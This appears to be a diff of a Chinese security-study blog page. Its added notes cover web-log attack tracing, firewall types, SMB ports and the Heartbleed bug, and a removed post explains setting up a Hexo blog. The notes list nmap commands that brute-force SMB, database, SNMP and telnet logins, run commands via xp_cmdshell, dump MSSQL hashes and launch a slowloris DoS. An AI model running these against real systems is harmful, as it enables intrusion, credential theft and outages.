+<h3 id="在WEB类安全问题的应急处置过程中web日志溯源攻击路径的思路？"><a href="#在WEB类安全问题的应急处置过程中web日志溯源攻击路径的思路？" class="headerlink" title="在WEB类安全问题的应急处置过程中web日志溯源攻击路径的思路？"></a>在WEB类安全问题的应急处置过程中web日志溯源攻击路径的思路？</h3><p>更好的思路是：<strong>正常总是基本相似 异常却各有各的异常</strong>（来源：<a href="http://www.91ri.org/16614.html）" target="_blank" rel="noopener">http://www.91ri.org/16614.html）</a><br>文中关于此理论已经讲得很详细，这里简单描述一下实现方法：<br>搜集大量正常请求，为每个请求的所有参数的值定义正常模型<br>通过Waf或者攻击规则来剔除所有发起过攻击请求的IP，从而得到所有来自用户的正常请求，将每个正常请求构造出对应的正常模型，比如：<br><a href="http://test.com/index.php?id=123" target="_blank" rel="noopener">http://test.com/index.php?id=123</a><br><a href="http://test.com/index.php?id=124" target="_blank" rel="noopener">http://test.com/index.php?id=124</a><br><a href="http://test.com/index.php?id=125" target="_blank" rel="noopener">http://test.com/index.php?id=125</a><br>那么关于此请求的正常模型则为 [N,N,N],不匹配此模型的请求则为异常请求<br>当对日志中的请求建立完正常的模型，通过正常模型来匹配找出所有不符合模型的请求时，发现效果的确不错，漏报较少，不过实践中发现另一个问题，那便是数据的清洗，我们能否建立对应的模型，取决于对日志数据的理解，如果在数据前期提取时，我们无法准确的提取哪些是请求地址那些为请求参数可能无法对某个请求建立正常模型<br>关于此理论已经有人写出了Demo实现，地址：<a href="https://github.com/SparkSharly/Sharly" target="_blank" rel="noopener">https://github.com/SparkSharly/Sharly</a></p>
+<hr>
+<h3 id="防火墙的常用三种技术是什么"><a href="#防火墙的常用三种技术是什么" class="headerlink" title="防火墙的常用三种技术是什么"></a>防火墙的常用三种技术是什么</h3><p><strong>包过滤技术:</strong>工作在网络层，仅根据数据包头中的IP地址、端口号、协议类型等标志确定是否允许数据包通过</p>
+<p><strong>应用代理:</strong>工作在应用层，通过编写不同的应用代理程序，实现对应用层数据的检测和分析(如SQL注入语句等)</p>
+<p><strong>状态检测（Stateful Inspection）：</strong>工作在2~4层，访问控制方式与1同，但处理的对象不是单个数据包，而是整个连接，通过规则表和连接状态表，综合判断是否允许数据包通过。</p>
+<p>完全内容检测（Compelete Content Inspection）：工作在2~7层，不仅分析数据包头信息、状态信息，而且对应用层协议进行还原和内容分析，有效防范混合型安全威胁。</p>
+<hr>
+<h3 id="139端口和445端口的区别是什么？是什么"><a href="#139端口和445端口的区别是什么？是什么" class="headerlink" title="139端口和445端口的区别是什么？是什么"></a>139端口和445端口的区别是什么？是什么</h3><p><strong>445–基于CIFS协议</strong></p>
+<p><strong>139–基于SMB协议</strong></p>
+<p><strong>用于文件和打印共享服务</strong></p>
+<hr>
+<h3 id="心脏滴血漏洞产生的原因，危害都有哪些？"><a href="#心脏滴血漏洞产生的原因，危害都有哪些？" class="headerlink" title="心脏滴血漏洞产生的原因，危害都有哪些？"></a><strong>心脏滴血漏洞产生的原因，危害都有哪些？</strong></h3><p>未能在memcpy()调用受害用户输入内容作为长度参数之前正确进行边界检查。攻击者可以追踪OpenSSL所分配的64KB缓存、将超出必要范围的字节信息复制到缓存当中再返回缓存内容，这样一来受害者的内存内容就会以每次64KB的速度进行泄露。</p>
+<p>可以通过该漏洞读取每次攻击泄露出来的信息，所以可能也可以获取到服务器的私钥，用户cookie和密码等</p>
+<p>在tls1_process_heartbeat函数和dtls1_process_heartbeat函数中，主要都是增加了对s-&gt;s3-&gt;rrec.length长度的判断。这 个函数后面的<strong>memcpy(bp, pl,  payload);填充payload长度的pl数据，而payload完全由用户控制</strong>，<strong>当传入过大数值时，可能导致越界访问pl之后的数据</strong>，若将读取的数据返回给用户即可造成敏感信息泄露。在一些测试用例中我们会发现response的length长度值总是比request的长度多出来了19个byte。读源代码可以知道，这是因为TLS和DTLS在处理心跳请求包逻辑中从堆空间上申请的内存大小由type、length、request的数据长度和pad四个部分组成，其中type,length,pad字段分为占1byte，2byte，16byte，所以response的数据总是比request的多出来19byte。 </p>
 <h2 id="排查本机网络问题："><a href="#排查本机网络问题：" class="headerlink" title="排查本机网络问题："></a><strong>排查本机网络问题：</strong></h2><table>
 <thead>
 <tr>
@@ -602,6 +1286,63 @@
 <p><strong>systeminfo 查看系统信息·</strong>··············</p>
 <p><strong>使用CS扩展的Ladon插件探测内网存活主机情况</strong></p>
 <p><strong>net view /domain 查看域情况</strong></p>
+<p>（1）  nmap –script=auth 192.168.137.*</p>
+<p>  　　负责处理鉴权证书（绕开鉴权）的脚本,也可以作为检测部分应用弱口令</p>
+<p>  　　（2）nmap –script=brute 192.168.137.*</p>
+<p>  　　提供暴力破解的方式  可对 数据库，smb，snmp等进行简单密码的暴力猜解</p>
+<p>  　　（3）nmap –script=default 192.168.137.* 或者 nmap -sC 192.168.137.*</p>
+<p>  　　默认的脚本扫描，主要是搜集各种应用服务的信息，收集到后，可再针对具体服务进行攻击</p>
+<p>  　　（4）nmap –script=vuln 192.168.137.*</p>
+<p>  　　检查是否存在常见漏洞</p>
+<p>  　　（5）nmap -n -p445 –script=broadcast 192.168.137.4</p>
+<p>  　　在局域网内探查更多服务开启状况</p>
+<p>  　 　检查vnc bypass</p>
+<p>  　　nmap  –script=realvnc-auth-bypass 192.168.137.4</p>
+<p>  　　(1)检查vnc认证方式</p>
+<p>  　　nmap  –script=vnc-auth  192.168.137.4</p>
+<p>  　　获取vnc信息</p>
+<p>  　　nmap  –script=vnc-info  192.168.137.4</p>
+<p>  　　（2）smb扫描：</p>
+<p>  　　smb破解</p>
+<p>  　　nmap  –script=smb-brute.nse 192.168.137.4</p>
+<p>  　　smb字典破解</p>
+<p>  　　nmap –script=smb-brute.nse –script-args=userdb=/var/passwd,passdb=/var/passwd 192.168.137.4</p>
+<p>  　　smb已知几个严重漏</p>
+<p>  　　nmap  –script=smb-check-vulns.nse –script-args=unsafe=1 192.168.137.4</p>
+<p>  　　查看共享目录</p>
+<p>  　　nmap -p 445  –script smb-ls –script-args ‘share=e$,path=,smbuser=test,smbpass=test’ 192.168.137.4</p>
+<p>  　　查看会话</p>
+<p>  　　nmap -n -p445 –script=smb-enum-sessions.nse –script-args=smbuser=test,smbpass=test 192.168.137.4</p>
+<p>  　　系统信息</p>
+<p>  　　nmap -n -p445 –script=smb-os-discovery.nse –script-args=smbuser=test,smbpass=test 192.168.137.4</p>
+<p>  　　（3）Mssql扫描：</p>
+<p>  　　猜解mssql用户名和密码</p>
+<p>  　　nmap -p1433 –script=ms-sql-brute –script-args=userdb=/var/passwd,passdb=/var/passwd 192.168.137.4</p>
+<p>  　　xp_cmdshell 执行命令</p>
+<p>  　　nmap -p 1433 –script ms-sql-xp-cmdshell –script-args  mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd=”net user”  192.168.137.4</p>
+<p>  　　（4）dumphash值</p>
+<p>  　　nmap -p 1433 –script ms-sql-dump-hashes.nse –script-args mssql.username=sa,mssql.password=sa  192.168.137.4</p>
+<p>  　　扫描root空口令</p>
+<p>  　　nmap -p3306 –script=mysql-empty-password.nse 192.168.137.4</p>
+<p>  　　列出所有mysql用户</p>
+<p>  　　nmap -p3306 –script=mysql-users.nse –script-args=mysqluser=root 192.168.137.4</p>
+<p>  　　（5） Oracle扫描：</p>
+<p>  　　oracle sid扫描</p>
+<p>  　　nmap –script=oracle-sid-brute -p 1521-1560 192.168.137.5</p>
+<p>  　　oracle弱口令破解</p>
+<p>  　　nmap –script oracle-brute -p 1521 –script-args oracle-brute.sid=ORCL,userdb=/var/passwd,passdb=/var/passwd 192.168.137.5</p>
+<p>  　　（6）其他一些比较好用的脚本</p>
+<p>  　　nmap –script=broadcast-netbios-master-browser 192.168.137.4  发现网关</p>
+<p>  　　nmap -p 873 –script rsync-brute –script-args ‘rsync-brute.module=www’ 192.168.137.4  破解rsync</p>
+<p>  　　nmap –script informix-brute -p 9088 192.168.137.4   informix数据库破解</p>
+<p>  　　nmap -p 5432 –script pgsql-brute 192.168.137.4    pgsql破解</p>
+<p>  　　nmap -sU –script snmp-brute 192.168.137.4       snmp破解</p>
+<p>  　　nmap -sV –script=telnet-brute 192.168.137.4      telnet破解</p>
+<p>  　　nmap –script=http-vuln-cve2010-0738 –script-args  ‘http-vuln-cve2010-0738.paths={/path1/,/path2/}’ <target>  jboss  autopwn</target></p>
+<p>  　　nmap –script=http-methods.nse 192.168.137.4 检查http方法</p>
+<p>  　　nmap –script http-slowloris –max-parallelism 400 192.168.137.4  dos攻击，对于处理能力较小的站点还挺好用的 ‘half-HTTP’ connections</p>
+<p>  　　nmap –script=samba-vuln-cve-2012-1182  -p 139 192.168.137.4</p>
+<p>  　　nmap –script=smb-brute –script-args=userdb=/tmp/帐号字典.txt,passdb=/tmp/密码字典.txt IP地址 -p 445</p>
 
       
       <!-- reward -->
@@ -2551,105 +3292,13 @@
 
 </article>
     
-    <article id="post-简单搭建个属于你的个人博客" class="article article-type-post" itemscope
-  itemprop="blogPost" data-scroll-reveal>
-
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2020/02/18/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E5%B1%9E%E4%BA%8E%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"
-    >简单搭建个属于你的个人博客</a
-  >
-</h2>
-  
-
-    </header>
-    
-
-    
-    <div class="article-meta">
-      <a href="/2020/02/18/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E5%B1%9E%E4%BA%8E%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" class="article-date">
-  <time datetime="2020-02-18T14:44:57.000Z" itemprop="datePublished">2020-02-18</time>
-</a>
-      
-      
-      
-      
-    </div>
-    
-
-    
-
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-
-
-      
-
-      
-      <hr>
-<p>没想到都大三老狗了，还是个新人的水准，这就是菜吧。但还是要努力学习呀，希望有个好的结果！</p>
-<p>废话不多说，开始小白的搭建博客教程吧~</p>
-<h4 id="1-安装git"><a href="#1-安装git" class="headerlink" title="1.安装git"></a>1.安装git</h4><p><a href="https://git-scm.com/downloads" target="_blank" rel="noopener">git官网传送门</a></p>
-<h4 id="2-安装Node-js"><a href="#2-安装Node-js" class="headerlink" title="2.安装Node.js"></a>2.安装Node.js</h4><p><a href="https://nodejs.org/en/" target="_blank" rel="noopener">Node.js官网传送门</a></p>
-<h4 id="3-安装Hexo"><a href="#3-安装Hexo" class="headerlink" title="3.安装Hexo"></a>3.安装Hexo</h4><p>Hexo拥有丰富的主题，比较推荐</p>
-<p>win+R  cmd 输入以下命令，安装hexo包</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo</span><br></pre></td></tr></table></figure>
-
-<h4 id="4-建立博客所在文件"><a href="#4-建立博客所在文件" class="headerlink" title="4.建立博客所在文件"></a>4.建立博客所在文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo init chj</span><br><span class="line">cd chj</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>
-
-<p>过程如下图：</p>
-<p><img src="/2020/02/18/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E5%B1%9E%E4%BA%8E%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1.png" alt="1234"></p>
-<p>文件下的目录如下：</p>
-<p><img src="/2020/02/18/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E5%B1%9E%E4%BA%8E%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/cmd.jpg" alt="1234"></p>
-<h4 id="config-yml"><a href="#config-yml" class="headerlink" title="_config.yml"></a>_config.yml</h4><p>这是网站的配值信息，可以在此配置大部分的参数。</p>
-<h4 id="source"><a href="#source" class="headerlink" title="source"></a>source</h4><p>这是存放用户资源的地方，文章会存放在其中的_posts文件夹下，而一些标签、归档则是在source文件夹下。</p>
-<h4 id="themes"><a href="#themes" class="headerlink" title="themes"></a>themes</h4><p>主题文件夹，Hexo 会根据主题来生成静态页面，博客所用的各种主题都存放在此目录下。</p>
-<h4 id="5-git的基本操作"><a href="#5-git的基本操作" class="headerlink" title="5.git的基本操作"></a>5.git的基本操作</h4><p>安装上诉步骤简单部署好以后，输入以下命令，然后本地localhost:4000访问，就可以看到自己的博客了~</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/02/18/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E5%B1%9E%E4%BA%8E%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/4000.png" alt="1234"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global user.name &quot;Your Name&quot;</span><br><span class="line">$ git config --global user.email &quot;email@example.com&quot;</span><br></pre></td></tr></table></figure>
-
-<p>因为Git是分布式版本控制系统，所以，每个机器都必须自报家门：你的名字和Email地址。你也许会担心，如果有人故意冒充别人怎么办？这个不必担心，首先我们相信大家都是善良无知的群众，其次，真的有冒充的也是有办法可查的。</p>
-<p>注意<code>git config</code>命令的<code>--global</code>参数，用了这个参数，表示你这台机器上所有的Git仓库都会使用这个配置，当然也可以对某个仓库指定不同的用户名和Email地址。</p>
-
-      
-      <!-- reward -->
-      
-    </div>
-    
-    
-      <!-- copyright -->
-      
-    <footer class="article-footer">
-      
-      
-
-    </footer>
-
-  </div>
-
-  
-
-  
-  
-  
-
-  
-
-</article>
-    
   </article>
   
 
   
   <nav class="page-nav">
     
-    <a class="extend prev" rel="prev" href="/">上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+    <a class="extend prev" rel="prev" href="/">上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">下一页</a>
   </nav>
   
 </section>
